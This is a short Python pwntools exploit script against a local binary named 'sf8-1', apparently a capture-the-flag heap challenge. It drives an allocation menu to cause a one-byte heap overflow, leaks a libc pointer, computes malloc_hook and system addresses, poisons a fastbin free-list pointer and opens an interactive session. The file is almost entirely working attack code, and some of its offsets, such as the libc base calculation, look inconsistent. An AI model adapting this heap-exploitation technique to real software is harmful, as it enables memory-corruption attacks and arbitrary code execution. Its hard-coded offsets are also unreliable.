from pwn import *

p = process("./sf8-1")

def alloc(size):
	p.sendlineafter("Command: ","1")
	p.sendlineafter("Size: ",str(size))
	
def fill(index, size, content):
	p.sendlineafter("Command: ","2")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content:",content)

def free(index):
	p.sendlineafter("Command: ","3")
	p.sendlineafter("Index:",str(index))

def dump(index):
	p.sendlineafter("Command: ","4")
	p.sendlineafter("Index: ",str(index))

alloc(0x18)#0
alloc(0x80)#1
alloc(0x10)#2
alloc(0x60)#3
input()
free(1)
fill(0,0x19,b'A'*0x18+b'\x93')

alloc(0x80)#1
dump(1)
p.recvuntil("Content: \n")
leak = p.recv(8)
leak = u64(leak)
malloc_hook = leak-0x68
target = leak +0xB9D
system = leak -0x37F7D8
libc_base = leak-0x411D29AB78
target2 = target+(0x7fb626121715-0x7fb626120715)

print("leak : ", hex(leak))
print("malloc_hook : ", hex(malloc_hook))
print("target : ",hex(target))
print("system : ",hex(system))
print("libc_base : ",hex(libc_base))
print("target2 : ",hex(target2))

free(3)
buf=b''
buf+=p64(0)*3+p64(0x71)
buf+=p64(target)

fill(2,0x28,buf)

alloc(0x60)#3
alloc(0x60)#4

input()

p.interactive()